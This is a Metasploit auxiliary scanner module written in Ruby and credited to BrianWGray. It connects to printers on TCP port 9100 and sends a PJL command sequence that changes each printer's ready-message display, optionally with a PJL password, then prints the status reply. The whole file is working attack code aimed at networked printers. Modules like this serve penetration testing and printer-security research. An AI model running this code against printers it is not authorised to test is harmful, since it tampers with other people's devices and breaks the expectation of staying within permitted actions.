#Metasploit
require 'msf/core'
class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp
	include Msf::Auxiliary::Scanner
	def initialize
		super(
			'Name'		=> 'PJL Ready Message change',
			'Version'	=> '$Revision: 2 $',
			'Description'	=> 'Module to change the ready message on one or multiple PJL printers',
			'Author'	=> 'BrianWGray',
			'License'	=> MSF_LICENSE
		)
		register_options(
			[
				Opt::RPORT(9100),
				OptString.new('RDYMSG', [true, 'Ready message string',"Metasploit"]),
				OptString.new('PJLPASS', [true, 'allows a PJL password to be specified','0'])		
			], self.class)
	end

	def run_host(ip)
		connect()
		pjldata = datastore['RDYMSG']		
		pjlpass = datastore['PJLPASS']
			#Build the PJL string buffer
			buf = "\e%-12345X@PJL JOB\r\n" +
			"@PJL JOB PASSWORD=#{pjlpass}\r\n" +
			"@PJL RDYMSG DISPLAY=\"#{pjldata}\"\r\n" +
			"@PJL INFO STATUS\r\n" +
			"@PJL EOJ\r\n" +
			"\e%-12345X\r\n\x0d\x0a"

			sock.puts(buf)		
			data = sock.recv(1024)

		print_status("Received: #{data} from #{ip}")
		disconnect()
	end
end
